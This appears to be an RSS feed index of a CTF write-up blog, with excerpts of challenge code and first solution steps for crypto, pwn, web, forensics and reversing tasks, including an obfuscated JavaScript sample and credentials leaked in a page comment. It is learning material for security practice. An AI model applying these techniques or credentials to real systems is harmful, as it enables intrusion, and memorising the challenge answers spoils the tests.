from random import randint xcoeff=[2220881165502059873403292638352563283672047788097000474246472547036149880673794935190953317495413822516051735501183996484673938426874803787946897055911986,3780868071235160215367199770952656972709510983146503211692869296836254519620768737356081836837102329626660962468333562050121427935761471039362287802941597,4902413424318450578332022710023815992030030940432088134156375736636296016273860394626141407089100644225364129305706233708267009976783719598126300552264686] ycoeff=[10133630993576627916260025550504106878405253409844193620608338129978685236278362029266353690006955194818074387390350472504283291952199370441443295790407675,3364000239596805500788439152587586988694473612770420810400457954622820421525205173981972752548906690775960238564395459369815397933405749174182967563999094, 5184466564604150683447715719961919989718796968566745874607480183961791804239357212974694797397047787503590843234526492414458478882622032364603797888695699] p=10369539704979520345376943788090457296701518777268113122376443474930073612795297691185597789473973789467303121639140064504782927997022419913721978857764263 class LCG: def __init__(self,p,xcoeffs,ycoeffs): self.p=p self.xcoeffs=xcoeffs self.ycoeffs=ycoeffs self.xstate =randint(1,p-1) self.ystate =randint(1,p-1) for i in range(randint(1,1337)): self.next() def next(self): self.xstate=pow(self.xcoeffs[0]+self.xcoeffs[1]*self.xstate+self.xcoeffs[2]*self.xstate**2,1,self.p) self.ystate=pow(self.ycoeffs[0]+self.ycoeffs[1]*self.ystate+self.ycoeffs[2]*self.ystate**2,1,self.p) def encrypt(self,msg): bin_msg=list(map(int, list(f"{msg:0512b}"))) encrypted=[] for i in bin_msg: self.next() if i==1: encrypted.append(self.xstate) else: encrypted.append(self.ystate) return encrypted flag=b"Securinets{???????????????????????????????????????}" flag=int.from_bytes(flag,"big") lcgCipher=LCG(p,xcoeff,ycoeff) encrypted_flag=lcgCipher.encrypt(flag) print("encrypted_flag=",encrypted_flag) Moreover, we are given the output of the program as output.</description></item><item><title>POOF</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/poof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/poof/</guid><description>We are given some files:
$ unzip -l POOF.zip Archive: POOF.zip Length Date Time Name ---------- ---------- ----- ---- 2567089 10-20-2022 11:12 candy_dungeon.pdf.boo 1096901984 10-20-2022 18:11 mem.dmp 7822474 10-20-2022 11:25 poof_capture.pcap 1126698 10-20-2022 12:04 Ubuntu_4.15.0-184-generic_profile.zip ---------- ------- 1108435601 4 files And we have an endpoint to connect to and answer some questions:
$ nc 159.65.48.79 31240 +-------+-----------------------------------------------------+ | Title | Description | +-------+-----------------------------------------------------+ | POOF | In my company, we are developing a | | | new python game for Halloween.</description></item><item><title>POOF</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/poof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/poof/</guid><description>We are given some files:
$ unzip -l forensics_poof.zip Archive: forensics_poof.zip Length Date Time Name ---------- ---------- ----- ---- 2567089 10-20-2022 11:12 candy_dungeon.pdf.boo 1096901984 10-20-2022 18:11 mem.dmp 7839830 10-20-2022 11:25 poof_capture.pcap 1126698 10-20-2022 12:04 Ubuntu_4.15.0-184-generic_profile.zip ---------- ------- 1108435601 4 files And we have an endpoint to connect to and answer some questions:
$ nc 159.65.48.79 31240 +-------+-----------------------------------------------------+ | Title | Description | +-------+-----------------------------------------------------+ | POOF | In my company, we are developing a | | | new python game for Halloween.</description></item><item><title>Poor Login</title><link>https://7rocky.github.io/en/ctf/ctflearn/binary/poor-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/binary/poor-login/</guid><description>We are given a 64-bit binary called login:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled We also have the C source code:
#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int menu() { printf("*** WINBLOWS LOGIN *********\n" "1. Login into user.\n" "2. Sign out.\n" "3. Print flag.\n" "4. Lock user.\n" "5. Restore user.\n" "&amp;gt; "); int resp = 0; scanf("%d", &amp;amp;resp); while (getchar() != '\n'); return resp; } struct creds { void *padding; char name[32]; int admin; }; struct creds *curr; struct creds *save; char *fake_flag; int main() { char buff[64]; setbuf(stdout, NULL); setbuf(stdin, NULL); while (1) { switch (menu()) { case 1: // Login curr = malloc(sizeof(*curr)); printf("</description></item><item><title>POST Practice</title><link>https://7rocky.github.io/en/ctf/ctflearn/web/post-practice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/web/post-practice/</guid><description>We are told to authenticate on a given URL using a POST request.
First of all, let&amp;rsquo;s make a GET request to check if we can have the credentials, using curl:
$ curl http://165.227.106.113/post.php &amp;lt;h1%gt;This site takes POST data that you have not submitted!&amp;lt;/h1&amp;gt;&amp;lt;!-- username: admin | password: 71urlkufpsdnlkadsf --&amp;gt; And there we have it. Now we only need to use a POST request with this information. Using -d on curl to enter the request body sets the request method to POST by default, so there is no need to specify -X POST:</description></item><item><title>Potion Master</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/potion-master/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/potion-master/</guid><description>We are given a Haskell script called potion.hs:
import Data.Char (ord) import Data.Bits (xor) -- Complete the incantation... flag = "HTB{XXX}" extractFlag :: String -&amp;gt; String extractFlag (s:rest) | s == 'H' || s == 'T' || s == 'B' = extractFlag rest | s == '{' &amp;&amp; last rest == '}' = init rest | otherwise = error ("Invalid format") chunks :: Int -&amp;gt; [a] -&amp;gt; [[a]] chunks n l | n == 0 = [] | n == 1 = [[x] | x &amp;lt;- l] | length l &amp;lt;= n = [l] | otherwise = [take n l] ++ (chunks n (drop n l)) takeLast :: Int -&amp;gt; [a] -&amp;gt; [a] takeLast n = reverse .</description></item><item><title>Potion Master</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/potion-master/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/potion-master/</guid><description>We are given a Haskell script called potion.hs:
import Data.Char (ord) import Data.Bits (xor) -- Complete the incantation... flag = "HTB{XXX}" extractFlag :: String -&amp;gt; String extractFlag (s:rest) | s == 'H' || s == 'T' || s == 'B' = extractFlag rest | s == '{' &amp;&amp; last rest == '}' = init rest | otherwise = error ("Invalid format") chunks :: Int -&amp;gt; [a] -&amp;gt; [[a]] chunks n l | n == 0 = [] | n == 1 = [[x] | x &amp;lt;- l] | length l &amp;lt;= n = [l] | otherwise = [take n l] ++ (chunks n (drop n l)) takeLast :: Int -&amp;gt; [a] -&amp;gt; [a] takeLast n = reverse .</description></item><item><title>pqqp</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/pqqp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/pqqp/</guid><description>We are given this Python source code that encrypts the flag:
from Crypto.Util.number import * p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 m = bytes_to_long(open("flag.txt", "rb").read().strip()) c = pow(m, e, n) pqqp = (pow(p, q, n) + pow(q, p, n)) % n print(f"{n = }") print(f"{e = }") print(f"{c = }") print(f"{pqqp = }") And we have the output.txt file:
n = 19678109133542698592305708016218863883460540049917712329432013892172528110292745184992950044286234053071380305255840348326164548510255147118470308166391801316954651278311516797693549738950638924838729113122082201649970553380521265027078990142823602788816122841173521655481024888439982252740049512798598085061773695717897738054691150959372485365062487195925100664710335322057804378500514036943988819273662050112952925141139754952427282840502980857190361170607335143494354546987865462698409956206631411308141753183566771545343693446609738596094372008339052131415140340456565555396933183573996686236769224009352680776141 e = 65537 c = 4072247787644405517693225466780406787448185227848467266590680538951503737695652776519815815044794587161578707809819763441075707137469351267404539758695849074266727221320662086207093016080297854717488042255308770890593983978724257303414642859978484084458380098954259220304333391581145689059564973907676661078965777905977665249069877734867259119271333543347675967002480182290529431802723432351160734165536930587939120516653618367482414081000718254774375447568464759357446892747598177493342245946293460645987948522541784101210339329312458616738544161953857715180345325332187115407714964472659039920532267119264418919947 pqqp = 286274681617083968101800572253589724107707315933733496895870570711787172051691156975540599189839527166581986519156360694553593020374681020209511667035419131460916677948315029070571749042370272329205309015536090768801019566664262350433731622252363771741528214379501493482631649996976367966453784254842455722642 First of all, we need to express $p^q + q^p \mod{n}$ in another way.</description></item><item><title>Practice Flag</title><link>https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/practice-flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/practice-flag/</guid><description>This challenge is only an introduction. It shows the flag directly: CTFlearn{4m_1_4_r3al_h4ck3r_y3t}.</description></item><item><title>Prime</title><link>https://7rocky.github.io/en/ctf/other/balsn-ctf/prime/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/balsn-ctf/prime/</guid><description>We are given the source code of the server in SageMath:
import gmpy2 import random from secret import FLAG def main(): n = int(input("prime: ")) if n &amp;lt;= 0: print("No mystiz trick") elif n.bit_length() &amp;lt; 256 or n.bit_length() &amp;gt; 512: print("Not in range") elif not is_prime(n): print("Not prime") else: x = int(input("factor: ")) if x &amp;gt; 1 and x &amp;lt; n and n % x == 0: print("You got me") print(FLAG) else: print("</description></item><item><title>Pumpkin Stand</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/pumpkin-stand/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/pumpkin-stand/</guid><description>We are given a 64-bit binary called pumpkin_stand:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we load the binary in Ghidra, we will see this decompiled C code for main:
void main() { long in_FS_OFFSET; short option; short amount; FILE *fp; undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); setup(); banner(); option = 0; amount = 0; while (true) { while (true) { while (true) { while (true) { menu(); __isoc99_scanf("</description></item><item><title>Pumpking</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/pumpking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/pumpking/</guid><description>We are given a 64-bit binary called pumpking:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Environment setup It might happen that we don&amp;rsquo;t have a version of Glibc that is accepted by the program:
$ ./pumpking zsh: no such file or directory: ./pumpking $ ldd pumpking ./pumpking: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pumpking) linux-vdso.so.1 (0x00007ffc78fd6000) libseccomp.so.2 =&amp;gt; /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f16439e4000) libc.</description></item><item><title>PumpkinSpice</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/pumpkinspice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/pumpkinspice/</guid><description>We are given the following website:
We also have the Python source code of the server (Flask).
Source code analysis The relevant file is app.py:
import string, time, subprocess from flask import Flask, request, render_template, abort from threading import Thread app = Flask(__name__) addresses = [] def start_bot(): from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.chrome.service import Service from selenium.webdriver.support.ui import WebDriverWait host, port = "localhost", 1337 HOST = f"</description></item><item><title>Pusheen Loves Graphs</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/pusheen-loves-graphs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/pusheen-loves-graphs/</guid><description>We are given a binary file called Pusheen. It we execute it, we will see a picture of a cat:
$ ./Pusheen ▐▀▄ ▄▀▌ ▄▄▄▄▄▄▄ ▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▄▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▒█▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌ ▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀ If we check the printable strings inside the file, there are a lot that start with e_ (actually, they run from e_0_0 to e_66_100). We can count them like this:</description></item><item><title>Put a ring on it</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/put-a-ring-on-it/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/put-a-ring-on-it/</guid><description>Ring Signatures are used in some cryptocurrencies to provide anonymity for who has signed a transaction or sent money. Can you break the anonymity of the ring signatures?
Challenge contributed by CryptoHack
Challenge files:
ed25519.py data.json chal.py We are given an implementation of a ring signature protocol, which is supposed to be an algorithm where a set of parties can validate signed messages but cannot determine who has signed it, providing anonymity to the signatures.</description></item><item><title>PwnShop</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/pwnshop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/pwnshop/</guid><description>We are given a 64-bit binary called pwnshop:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Reverse engineering We can use Ghidra to analyze the binary and look at the decompiled source code in C:
undefined[16] main() { int option_char; ulong in_RCX; char option; setup(); puts("========= HTB PwnShop ==========="); while (true) { while (true) { puts("What do you wanna do?"); printf("1&amp;gt; Buy\n2&amp;gt; Sell\n3&amp;gt; Exit\n&amp;gt; "</description></item><item><title>qcg-k</title><link>https://7rocky.github.io/en/ctf/other/corctf/qcg-k/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/corctf/qcg-k/</guid><description>We are provided with the Python source code to encrypt the flag:
from random import randint from Crypto.Util.number import inverse, bytes_to_long from Crypto.Util.Padding import pad from Crypto.Cipher import AES from hashlib import sha256 import os class PRNG: def __init__(self, mod): self.coeffs = [randint(1,mod) for _ in range(16)] self.mod = mod self.state = randint(1, mod) def next(self): self.state = sum(coeff * self.state**i for i,coeff in enumerate(self.coeffs)) % self.mod return self.state q = 77897050769654696452572824710099972349639759246855689360228775736949644730457 p = 16158503035655503650357438344334975980222051334857742016065172713762327569433945446598600705761456731844358980460949009747059779575245460547544076193224141560315438683650498045875098875194826053398028819192033784138396109321309878080919047169238085235290822926018152521443787945770532904303776199561965192760957166694834171210342487393282284747428088017663161029038902829665513096354230157075129296432088558362971801859230928678799175576150822952201848806616643615613562842355410104862578550863465661734839271290328348967522998634183738667876030053003528149973545862146652611656961993385485831857222177076627368030677 g = 8986665761954289500303442250714013257267958541522625625218561169199279419042595142610100040988087502082590727136475698540201993746428470373168993292913039320311763660217801850784878564935450880018874371587199649965685742134884651107493812479234148805689664214460255588413695390568080942032263992785493208738282307168575867379095610792294961396770216272833435684440954774251862518243249608047971545524864083813237641522093309769070100469565960964654622352499351408269623653746705149014123772757153278180752939277436109738789404154406479625797746665884100327134640664657032784940498017583213619767216652249367376800156 x = randint(1, q - 1) y = pow(g,x,p) kPRNG = PRNG(q) def hsh(msg): return bytes_to_long(sha256(msg).</description></item><item><title>QR Code</title><link>https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/qr-code/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/qr-code/</guid><description>We are given an image containing a QR code:
If we scan it, we will get this string:
c3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI= It seems to be encoded in Base64, let&amp;rsquo;s try to decode it:
$ echo c3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI= | base64 -d synt vf : a0_obql_s0etrg_de_pbqr But we don&amp;rsquo;t see anything readable. There seems to be a substitution algorithm such as ROT13. Let&amp;rsquo;s go to CyberChef and check it out:
We see: &amp;ldquo;flag is : n0_body_f0rget_qr_code&amp;rdquo;, so the flag is: CTFlearn{n0_body_f0rget_qr_code}.</description></item><item><title>Quememu</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/quememu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/quememu/</guid><description>In this challenge they give us a PCI device (Peripheral Component interconnect) that communicates by MMIO (Memory-mapped I/O). This device has been added to the qemu codebase and they also give us the compiled binary and a diff.txt file with the added differences:
# ls -l total 90964 -rw-rw-r-- 1 root root 718 Feb 13 21:42 Dockerfile -rwxrwxr-x 1 root root 59 Feb 13 21:42 deploy_docker.sh -rw-rw-r-- 1 root root 5494 Feb 13 21:41 diff.</description></item><item><title>Query</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/query/</guid><description>We are given a JavaScript file called htb.js:
HTB=~[];HTB={___:++HTB,$$$$:(![]+"")[HTB],__$:++HTB,$_$_:(![]+"")[HTB],_$_:++HTB,$_$$:({}+"")[HTB],$$_$:(HTB[HTB]+"")[HTB],_$$:++HTB,$$$_:(!""+"")[HTB],$__:++HTB,$_$:++HTB,$$__:({}+"")[HTB],$$_:++HTB,$$$:++HTB,$___:++HTB,$__$:++HTB};HTB.$_=(HTB.$_=HTB+"")[HTB.$_$]+(HTB._$=HTB.$_[HTB.__$])+(HTB.$$=(HTB.$+"")[HTB.__$])+((!HTB)+"")[HTB._$$]+(HTB.__=HTB.$_[HTB.$$_])+(HTB.$=(!""+"")[HTB.__$])+(HTB._=(!""+"")[HTB._$_])+HTB.$_[HTB.$_$]+HTB.__+HTB._$+HTB.$;HTB.$$=HTB.$+(!""+"")[HTB._$$]+HTB.__+HTB._+HTB.$+HTB.$$;HTB.$=(HTB.___)[HTB.$_][HTB.$_];HTB.$(HTB.$(HTB.$$+"\""+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$_$_+(![]+"")[HTB._$_]+"("+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"(\\"+HTB.__$+HTB.$$_+HTB.___+","+HTB.$_$_+","+HTB.$$__+",\\"+HTB.__$+HTB.$_$+HTB._$$+","+HTB.$$$_+","+HTB.$$_$+"){"+HTB.$$$_+"="+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"("+HTB.$$__+"){\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$__+"};\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"(!''.\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+HTB.$_$_+HTB.$$__+HTB.$$$_+"(/^/,\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+")){\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$$_+"("+HTB.$$__+"--){"+HTB.$$_$+"["+HTB.$$__+"]=\\"+HTB.__$+HTB.$_$+HTB._$$+"["+HTB.$$__+"]||"+HTB.$$__+"}\\"+HTB.__$+HTB.$_$+HTB._$$+"=["+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"("+HTB.$$$_+"){\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$_$+"["+HTB.$$$_+"]}];"+HTB.$$$_+"="+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"(){\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"'\\\\\\\\\\"+HTB.__$+HTB.$$_+HTB.$$$+"+'};"+HTB.$$__+"="+HTB.__$+"};\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$$_+"("+HTB.$$__+"--){\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"(\\"+HTB.__$+HTB.$_$+HTB._$$+"["+HTB.$$__+"]){\\"+HTB.__$+HTB.$$_+HTB.___+"=\\"+HTB.__$+HTB.$$_+HTB.___+".\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+HTB.$_$_+HTB.$$__+HTB.$$$_+"(\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.$__+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"('\\\\\\\\"+HTB.$_$$+"'+"+HTB.$$$_+"("+HTB.$$__+")+'\\\\\\\\"+HTB.$_$$+"','\\"+HTB.__$+HTB.$__+HTB.$$$+"'),\\"+HTB.__$+HTB.$_$+HTB._$$+"["+HTB.$$__+"])}}\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.$__+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"}('"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.___+HTB.$__+"(){"+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB._$_+HTB.___+HTB.$__$+"\\\\')."+HTB._$$+HTB.___+HTB.$_$+"(\\\\'"+HTB._$$+HTB.___+HTB.$$_+"\\\\',"+HTB.__$+HTB.$__$+HTB.$$$+")}"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__$+HTB.$$$+"(){"+HTB._$$+HTB.___+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.___+HTB.$_$+"=\\\""+HTB._$$+HTB.___+HTB._$$+"://"+HTB._$$+HTB.___+HTB._$_+"."+HTB.__$+HTB.$__$+HTB._$$+"/\\\";"+HTB.__$+HTB.$__$+"("+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB.__$+HTB.___+HTB.__$+"\\\\')."+HTB.$__+HTB.$__+"&amp;&amp;"+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB.__$+HTB.___+HTB.__$+"\\\\')."+HTB.$__+HTB.$__+"."+HTB._$_+HTB.$__$+HTB.$___+"(\\\\'@"+HTB._$_+HTB.$__$+HTB.$$$+"."+HTB.__$+HTB.$__$+HTB._$$+"\\\\')){"+HTB._$_+HTB.___+HTB.___+"."+HTB._$_+HTB.$__$+HTB.$__$+"("+HTB._$_+HTB.___+HTB.___+"."+HTB._$$+HTB.___+HTB.___+"("+HTB._$_+HTB.___+HTB.$__+"("+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB.__$+HTB.___+HTB.__$+"\\\\')."+HTB.$__+HTB.$__+","+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB._$_+HTB.___+HTB.$__$+"\\\\')."+HTB.$__+HTB.$__+"),\\\""+HTB._$$+HTB.___+HTB.__$+"\\\"),"+HTB._$_+HTB.___+HTB.$_$+",\\\""+HTB._$$+HTB.___+HTB.$___+"\\\")}}"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.___+HTB.$__+"("+HTB._$_+HTB.___+HTB.$$_+","+HTB.__$+HTB.$__$+HTB.___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$___+HTB.$__$+"=[\\\\'"+HTB._$$+HTB.___+HTB.$__$+"==\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$$_+"\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$$$+"==\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$__$+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$_$+"\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$__+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.___+"==\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.__$+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB._$_+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB._$$+"==\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.$$_+"\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.$_$+"=\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$__$+"==\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.___+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.__$+"==\\\\',\\\\'"+HTB._$_+HTB.$___+HTB._$_+"\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$___+"\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$$$+"/"+HTB._$_+HTB.$$$+HTB._$$+"=\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB._$_+"==\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$__+"/"+HTB._$_+HTB.$$$+HTB.$_$+"==\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$$_+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB._$$+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$__+"=\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.__$+"/"+HTB._$_+HTB.$__$+HTB._$_+"=\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB._$$+"/"+HTB._$_+HTB.$__$+HTB.$__+"\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.___+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$__$+"=\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$_$+"=\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$$_+"/"+HTB._$_+HTB.$___+HTB.$$$+"+"+HTB._$_+HTB.$___+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.___+"\\\\',\\\\'"+HTB._$$+HTB._$_+HT